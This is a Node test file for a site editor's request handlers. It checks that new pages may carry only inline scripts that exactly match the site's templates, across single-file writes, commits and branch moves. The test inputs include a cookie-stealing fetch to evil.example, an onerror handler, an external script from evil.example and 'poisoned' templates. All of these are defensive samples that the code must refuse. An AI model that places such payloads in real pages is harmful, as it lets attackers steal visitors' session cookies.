/**
 * A new page made from the site's own template.
 *
 * "New post or page" copies `_templates/page.html` (or `post.html`), and a
 * site's template may hold a small script of the owner's: a phone menu, say.
 * An invited editor's new page is checked by the worker, and a new file with
 * an inline script used to be refused outright, so on such a site an editor
 * with the New page tool could never make a page.
 *
 * Now a NEW page may carry what ONE of the site's templates carries, as the
 * branch being written to has it, and nothing more. These tests drive the
 * real request handlers by both routes an editor's write can take (one file,
 * and a commit of several), and hold each thing that must stay impossible.
 * GitHub is played by a small stand-in below.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { REPO, editorEnv, withFetch, call, b64, jsonRes, githubWrites } from './worker-harness.js';

const GH = 'https://api.github.com';
const BLOCKED = 'blocked: editors cannot add scripts or executable markup to a page';
const MENU = "document.querySelector('.menu-button').addEventListener('click',()=>document.body.classList.toggle('menu-open'))";
const EVIL = "fetch('https://evil.example/?c='+document.cookie)";
const page = (title, ...scripts) => `<!doctype html><html><head><meta charset="utf-8"><title>${title}</title></head><body><h1 data-cms="page_title">${title}</h1>${scripts.map(s => `<script>${s}</script>`).join('')}</body></html>`;
const TEMPLATE = page('{{title}}', MENU);
const NEW_PAGE = page('About us', MENU);
const INDEX = page('Home', MENU);

const h = (n) => String(n).padStart(40, '0');
const blobSha = (text) => createHash('sha1').update(text).digest('hex');
const STAMP = { name: 'Sam (via Kiln)', email: 'kiln-editor@users.noreply.github.com' };

/**
 * GitHub with named commits and branches. `commits` maps a commit's sha to
 * { files, parent }; `branches` maps a branch name to the sha at its head.
 */
function github({ commits, branches, defaultBranch = 'main' }) {
  const blobs = new Map();
  for (const c of Object.values(commits)) for (const text of Object.values(c.files)) blobs.set(blobSha(text), text);
  const entries = (files) => Object.entries(files).map(([path, text]) => ({ path, mode: '100644', type: 'blob', sha: blobSha(text), size: Buffer.byteLength(text) }));
  return async (url, init) => {
    if (init.method !== 'GET') return jsonRes({ sha: h(99), content: {}, commit: { sha: h(99) } }, 201);
    const path = url.slice(`${GH}/repos/${REPO}`.length);
    if (path === '') return jsonRes({ default_branch: defaultBranch });
    let m;
    if ((m = /^\/git\/ref\/heads\/(.+)$/.exec(path))) {
      const sha = branches[decodeURIComponent(m[1])];
      return sha ? jsonRes({ ref: `refs/heads/${m[1]}`, object: { sha, type: 'commit' } }) : undefined;
    }
    if ((m = /^\/git\/commits\/([0-9a-f]{40})$/.exec(path)) && commits[m[1]]) {
      const c = commits[m[1]];
      return jsonRes({ sha: m[1], tree: { sha: `tree${m[1]}` }, parents: c.parent ? [{ sha: c.parent }] : [], author: STAMP });
    }
    if ((m = /^\/git\/trees\/tree([0-9a-f]{40})\?recursive=1$/.exec(path)) && commits[m[1]]) {
      return jsonRes({ tree: entries(commits[m[1]].files), truncated: false });
    }
    if ((m = /^\/git\/blobs\/([0-9a-f]{40})$/.exec(path)) && blobs.has(m[1])) {
      return jsonRes({ content: b64(blobs.get(m[1])), encoding: 'base64' });
    }
    if (path.startsWith('/compare/')) return jsonRes({ status: 'identical', ahead_by: 0, behind_by: 0 });
  };
}

const HEAD = h(1), NEXT = h(2);
/** A site whose main branch holds `site`, and one commit on top of it that leaves the site holding `after`. */
const siteAnd = (site, after, more = {}) => github({
  commits: { [HEAD]: { files: site }, [NEXT]: { files: after, parent: HEAD }, ...(more.commits || {}) },
  branches: { main: HEAD, ...(more.branches || {}) },
});

const editor = (session = {}) => editorEnv({ features: ['newpost'], ...session });
const put = (env, path, text, extra = {}) =>
  call(env, 'PUT', `/gh/repos/${REPO}/contents/${path}`, { body: { message: 'x', content: b64(text), branch: 'main', ...extra } });
const postCommit = (env, parent = HEAD, sha = NEXT) => call(env, 'POST', `/gh/repos/${REPO}/git/commits`, { body: { message: 'x', tree: `tree${sha}`, parents: [parent] } });
const moveMain = (env, sha = NEXT, branch = 'main') => call(env, 'PATCH', `/gh/repos/${REPO}/git/refs/heads/${branch}`, { body: { sha } });
const blocked = (r, why) => {
  assert.equal(r.status, 403, `${why}: ${JSON.stringify(r.json)}`);
  assert.equal(r.json.error, BLOCKED, why);
};
const reads = (calls, part) => calls.filter(c => c.method === 'GET' && c.url.includes(part)).length;

const SITE = { 'index.html': INDEX, '_templates/page.html': TEMPLATE };

/** The same new file, sent by each of the three places a write is judged. Returns the three answers. */
async function byEveryRoute(site, path, text, env = editor()) {
  return withFetch(siteAnd(site, { ...site, [path]: text }), async (calls) => {
    const out = { put: await put(env, path, text), commit: await postCommit(env), move: await moveMain(env) };
    out.writes = githubWrites(calls).length;
    return out;
  });
}
async function refusedByEveryRoute(site, path, text, why) {
  const r = await byEveryRoute(site, path, text);
  blocked(r.put, `${why} (one file)`);
  blocked(r.commit, `${why} (commit)`);
  blocked(r.move, `${why} (branch moved)`);
  assert.equal(r.writes, 0, `${why}: nothing reaches GitHub`);
  return r;
}

// ─── What an editor can now do ───────────────────────────────────────────────

test('new page: a page made from a template that holds the owner\'s script is accepted, by every route', async () => {
  const r = await byEveryRoute(SITE, 'about/index.html', NEW_PAGE);
  assert.equal(r.put.status, 201, JSON.stringify(r.put.json));
  assert.equal(r.commit.status, 201, JSON.stringify(r.commit.json));
  assert.equal(r.move.status, 201, JSON.stringify(r.move.json));
});

test('new page: a post made from post.html is accepted the same way, and so is a page that keeps a form and a click handler the template has', async () => {
  const fancy = '<html><body><button onclick="menu()">Menu</button><form action="/subscribe"><input name="e"></form><h1 data-cms="post_title">{{title}}</h1></body></html>';
  const site = { 'index.html': INDEX, '_templates/post.html': fancy };
  const r = await byEveryRoute(site, 'blog/first/index.html', fancy.replace('{{title}}', 'First'));
  assert.deepEqual([r.put.status, r.commit.status, r.move.status], [201, 201, 201]);
});

test('new page: a site kept in a folder of its repository has its templates there, and they count for pages under that folder', async () => {
  const site = { 'site/index.html': INDEX, 'site/_templates/page.html': TEMPLATE };
  const r = await byEveryRoute(site, 'site/about/index.html', NEW_PAGE);
  assert.deepEqual([r.put.status, r.commit.status, r.move.status], [201, 201, 201]);
  // A templates folder that is not above the new file is not this page's template.
  await refusedByEveryRoute({ 'index.html': INDEX, 'other/_templates/page.html': TEMPLATE }, 'about/index.html', NEW_PAGE, 'a template in another folder');
});

// ─── What stays impossible ───────────────────────────────────────────────────

test('new page: a script the templates do not have is refused', async () => {
  const r = await refusedByEveryRoute(SITE, 'about/index.html', page('About us', MENU, EVIL), 'an extra script');
  assert.match(r.put.json.detail, /^script-inline:/);
  await refusedByEveryRoute(SITE, 'about/index.html', page('About us', EVIL), 'only a script of the editor\'s own');
  await refusedByEveryRoute(SITE, 'about/index.html', NEW_PAGE.replace('<h1', '<img src=x onerror="steal()"><h1'), 'a handler the template does not have');
  await refusedByEveryRoute(SITE, 'about/index.html', NEW_PAGE.replace('</body>', '<script src="https://evil.example/x.js"></script></body>'), 'a script from another site');
});

test('new page: the template\'s script twice, when the template has it once, is refused', async () => {
  await refusedByEveryRoute(SITE, 'about/index.html', page('About us', MENU, MENU), 'the same script twice');
});

test('new page: two templates that each hold the script once do not add up to twice', async () => {
  const site = { ...SITE, '_templates/post.html': page('{{title}}', MENU) + '<!-- post -->' };
  await refusedByEveryRoute(site, 'about/index.html', page('About us', MENU, MENU), 'once from each of two templates');
  // Nor is one template's script joined to another's.
  const other = "console.log('post')";
  const two = { ...SITE, '_templates/post.html': page('{{title}}', other) };
  await refusedByEveryRoute(two, 'about/index.html', page('About us', MENU, other), 'one script from each of two templates');
});

test('new page: the template\'s script with one character changed is refused', async () => {
  await refusedByEveryRoute(SITE, 'about/index.html', page('About us', MENU.replace('menu-open', 'menu-opem')), 'one letter changed');
  await refusedByEveryRoute(SITE, 'about/index.html', page('About us', MENU + ';'), 'one character added');
});

test('new page: a new file with a script, on a site with no templates, is refused as before', async () => {
  await refusedByEveryRoute({ 'index.html': INDEX }, 'about/index.html', NEW_PAGE, 'no templates at all');
  // A script that another page of the site has is not a template's script.
  await refusedByEveryRoute({ 'index.html': page('Home', EVIL) }, 'about/index.html', page('About us', EVIL), 'a script taken from an ordinary page');
});

test('new page: an existing page still cannot be given a script, even one a template has', async () => {
  const plain = page('Contact');
  const site = { ...SITE, 'contact.html': plain };
  await withFetch(siteAnd(site, { ...site, 'contact.html': page('Contact', MENU) }), async (calls) => {
    const env = editor();
    blocked(await put(env, 'contact.html', page('Contact', MENU), { sha: blobSha(plain) }), 'one file');
    blocked(await postCommit(env), 'commit');
    blocked(await moveMain(env), 'branch moved');
    assert.equal(githubWrites(calls).length, 0);
  });
});

// ─── A template cannot be made to carry a script first ───────────────────────

test('templates: an editor may change a template\'s words, and may not add a script to it', async () => {
  const reworded = TEMPLATE.replace('<h1', '<p>Welcome.</p><h1');
  await withFetch(siteAnd(SITE, { ...SITE, '_templates/page.html': reworded }), async () => {
    const env = editor();
    assert.equal((await put(env, '_templates/page.html', reworded, { sha: blobSha(TEMPLATE) })).status, 201);
    assert.equal((await postCommit(env)).status, 201);
    assert.equal((await moveMain(env)).status, 201);
  });
  const poisoned = page('{{title}}', MENU, EVIL);
  await withFetch(siteAnd(SITE, { ...SITE, '_templates/page.html': poisoned }), async (calls) => {
    const env = editor();
    blocked(await put(env, '_templates/page.html', poisoned, { sha: blobSha(TEMPLATE) }), 'one file');
    blocked(await postCommit(env), 'commit');
    blocked(await moveMain(env), 'branch moved');
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('templates: a template changed and a page made from it in the same commit are both judged by the template as it was', async () => {
  const poisoned = page('{{title}}', MENU, EVIL);
  const made = page('About us', MENU, EVIL);
  // The page comes first in the commit, so it is the page that is judged first.
  await withFetch(siteAnd(SITE, { 'about/index.html': made, 'index.html': INDEX, '_templates/page.html': poisoned }), async (calls) => {
    const env = editor();
    const c = await postCommit(env);
    blocked(c, 'commit');
    assert.equal(c.json.path, 'about/index.html');
    blocked(await moveMain(env), 'branch moved');
    assert.equal(githubWrites(calls).length, 0);
  });
  // A template the site did not have, added with a script of the editor's, is a new file like any other.
  await withFetch(siteAnd(SITE, { 'blog/x.html': page('X', EVIL), ...SITE, '_templates/post.html': page('{{title}}', EVIL) }), async (calls) => {
    const env = editor();
    blocked(await put(env, '_templates/post.html', page('{{title}}', EVIL)), 'one file');
    blocked(await postCommit(env), 'commit');
    blocked(await moveMain(env), 'branch moved');
    assert.equal(githubWrites(calls).length, 0);
  });
});

test('templates: a new template may hold what another template holds, so nothing more can come from it later', async () => {
  const r = await byEveryRoute(SITE, '_templates/post.html', page('{{title}}', MENU));
  assert.deepEqual([r.put.status, r.commit.status, r.move.status], [201, 201, 201]);
});

// ─── Only the branch being written to counts ─────────────────────────────────

test('branches: a template on another branch does not count for a page written to main', async () => {
  const poisoned = { ...SITE, '_templates/page.html': page('{{title}}', EVIL) };
  const OTHER = h(5), ON_OTHER = h(6);
  const made = page('About us', EVIL);
  const gh = github({
    commits: {
      [HEAD]: { files: SITE },
      [OTHER]: { files: poisoned },
      [NEXT]: { files: { ...SITE, 'about/index.html': made }, parent: HEAD },
      [ON_OTHER]: { files: { ...poisoned, 'about/index.html': made }, parent: OTHER },
    },
    branches: { main: HEAD, 'kiln-drafts': OTHER, 'kiln/suggest-sam-1': OTHER },
  });
  await withFetch(gh, async (calls) => {
    const env = editor();
    blocked(await put(env, 'about/index.html', made), 'one file to main');
    blocked(await put(env, 'about/index.html', made, { branch: undefined }), 'one file to the default branch');
    blocked(await postCommit(env), 'commit on main');
    blocked(await moveMain(env), 'main moved');
    // A commit is judged by the parent it names, and is inert until a branch
    // is moved to it. One that sits on another branch cannot be put on main.
    assert.equal((await postCommit(env, OTHER, ON_OTHER)).status, 201);
    const move = await moveMain(env, ON_OTHER);
    assert.equal(move.status, 403);
    assert.equal(move.json.code, 'ref_not_direct');
    assert.equal(githubWrites(calls).filter(c => !c.url.endsWith('/git/commits')).length, 0, 'nothing but the inert commit reaches GitHub');
  });
});

test('branches: the templates are read from the head of the branch the write names, asked for as a branch', async () => {
  await withFetch(siteAnd(SITE, SITE), async (calls) => {
    assert.equal((await put(editor(), 'about/index.html', NEW_PAGE, { branch: 'main' })).status, 201);
    const asked = calls.filter(c => c.method === 'GET').map(c => c.url.slice(`${GH}/repos/${REPO}`.length));
    assert.deepEqual(asked, [
      '/git/ref/heads/main',
      `/git/commits/${HEAD}`,
      `/git/trees/tree${HEAD}?recursive=1`,
      `/git/blobs/${blobSha(TEMPLATE)}`,
    ]);
  });
  // No branch named: GitHub writes to the default branch, so that is the one read.
  await withFetch(github({ commits: { [HEAD]: { files: SITE }, [h(5)]: { files: { 'index.html': INDEX } } }, branches: { live: HEAD, main: h(5) }, defaultBranch: 'live' }), async (calls) => {
    assert.equal((await put(editor(), 'about/index.html', NEW_PAGE, { branch: undefined })).status, 201);
    assert.equal(reads(calls, '/git/ref/heads/live'), 1);
    blocked(await put(editor(), 'about/index.html', NEW_PAGE, { branch: 'main' }), 'a branch whose templates folder is empty');
  });
});

test('branches: a branch that is not named in plain words gets no templates', async () => {
  await withFetch(siteAnd(SITE, SITE), async (calls) => {
    for (const branch of [123, '', null, ['main'], { name: 'main' }]) {
      blocked(await put(editor(), 'about/index.html', NEW_PAGE, { branch }), `branch ${JSON.stringify(branch)}`);
    }
    blocked(await put(editor(), 'about/index.html', NEW_PAGE, { branch: 'no-such-branch' }), 'a branch that is not there');
    assert.equal(githubWrites(calls).length, 0);
  });
});

// ─── What it costs ───────────────────────────────────────────────────────────

test('cost: GitHub is asked for the templates only when a new page would otherwise be refused', async () => {
  const plain = page('About us');
  await withFetch(siteAnd(SITE, { ...SITE, 'about/index.html': plain }), async (calls) => {
    const env = editor();
    assert.equal((await put(env, 'about/index.html', plain)).status, 201);
    assert.equal(calls.filter(c => c.method === 'GET').length, 0, 'a new page with no script asks GitHub nothing');
    calls.length = 0;
    assert.equal((await postCommit(env)).status, 201);
    assert.equal(reads(calls, `/git/blobs/${blobSha(TEMPLATE)}`), 0, 'the template is not read for a commit that needs no template');
  });
  await withFetch(siteAnd(SITE, { ...SITE, 'about/index.html': NEW_PAGE }), async (calls) => {
    const env = editor();
    assert.equal((await postCommit(env)).status, 201);
    assert.equal(reads(calls, '/git/trees/'), 2, 'no tree is read beyond the two a commit always reads');
    assert.equal(reads(calls, `/git/blobs/${blobSha(TEMPLATE)}`), 1, 'one more file is read: the template');
  });
  // An existing page's change never asks for the templates.
  await withFetch(siteAnd(SITE, SITE), async (calls) => {
    blocked(await put(editor(), 'index.html', page('Home', MENU, EVIL), { sha: blobSha(INDEX) }), 'a script added to an existing page');
    assert.equal(reads(calls, '/git/ref/'), 0);
  });
});

test('cost: when GitHub cannot be asked for the templates the page is refused, as it was before', async () => {
  const gh = siteAnd(SITE, SITE);
  await withFetch(async (url, init) => (/\/git\/trees\//.test(url) ? jsonRes({ message: 'boom' }, 500) : gh(url, init)), async (calls) => {
    blocked(await put(editor(), 'about/index.html', NEW_PAGE), 'the tree could not be read');
    assert.equal(githubWrites(calls).length, 0);
  });
  await withFetch(async (url, init) => (/\/git\/trees\//.test(url) ? jsonRes({ tree: [], truncated: true }) : gh(url, init)), async () => {
    blocked(await put(editor(), 'about/index.html', NEW_PAGE), 'only part of the tree came back');
  });
});

// ─── The other rules still hold ──────────────────────────────────────────────

test('other rules: the New page tool is still needed, and so is the folder', async () => {
  const r = await byEveryRoute(SITE, 'about/index.html', NEW_PAGE, editorEnv());
  for (const a of [r.put, r.move]) {
    assert.equal(a.status, 403);
    assert.equal(a.json.grant, 'newpost');
  }
  const scoped = await byEveryRoute(SITE, 'about/index.html', NEW_PAGE, editor({ paths: ['blog/'] }));
  assert.deepEqual([scoped.put.status, scoped.commit.status, scoped.move.status], [403, 403, 403]);
  assert.equal(scoped.writes, 0);
});
